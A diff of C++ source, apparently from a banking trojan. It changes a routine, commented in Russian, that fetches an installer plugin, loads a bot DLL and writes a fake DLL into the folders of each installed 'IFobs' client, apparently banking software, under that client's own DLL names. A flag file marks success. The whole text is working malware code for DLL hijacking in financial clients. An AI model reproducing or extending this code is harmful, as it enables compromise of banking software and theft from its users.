@@ -12,6 +12,7 @@
 #include "StrConsts.h"
 #include <shlwapi.h>
 #include <shlobj.h>
+#include "installer.h"
 
 #include "BotDebug.h"
 
@@ -717,16 +718,19 @@ DWORD WINAPI IntallFakeDll(void*)
 	DBG("IFobs", "Начинаем инсталяцию fake.dll");
 	
 	TPlugin intaller(GetStr(EStrFakeDllInstaller));
-	TPlugin bot(GetStr(EStrBotPlug));
 
-	// Загружаем плагины
-	if (!intaller.Download(true) || !bot.Download(false))
+	// Загружаем плагин
+	if (!intaller.Download(true))
 	{
-		DBG("IFobs", "Плагины не удалось загрузить" );
+		DBG("IFobs", "Плагин не удалось загрузить" );
 		return 0;
 	}
 
-	DBG("IFobs", "Плагины успешно загружены, начинаем инсталцию");
+	void* dllBody;
+	DWORD dllSize;
+	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
+
+	DBG("IFobs", "Плагин успешно загружены, начинаем инсталцию");
 
 	// Запускаем инсталяцию
 	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);
@@ -737,7 +741,7 @@ DWORD WINAPI IntallFakeDll(void*)
 		char folderClient[MAX_PATH];
 		bool installed = false;
 		//выделяем место для бот плага
-		BYTE* botData = (BYTE*)MemAlloc( bot.Size() );
+		BYTE* botData = (BYTE*)MemAlloc(dllSize);
 		if( botData )
 		{
 			for( int i = 0; i < clients.Count(); i++ )
@@ -749,8 +753,8 @@ DWORD WINAPI IntallFakeDll(void*)
 				{
 					pPathRemoveFileSpecA(folderClient);
 					pPathAppendA( folderClient, dlls[n] );
-					m_memcpy( botData, bot.Data(), bot.Size() );
-					if( install( folderClient, botData, bot.Size()) )
+					m_memcpy( botData, dllBody, dllSize );
+					if( install( folderClient, botData, dllSize ) )
 					{
 						DBG("IFobs", "Инсталяция fake.dll для '%s' успешно выполнена", clients[i].t_str() );
 						installed = true;
@@ -771,6 +775,7 @@ DWORD WINAPI IntallFakeDll(void*)
 			Bot->CreateFileA( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
 		}
 	}
+	MemFree(dllBody);
 	return 0;
 }
 
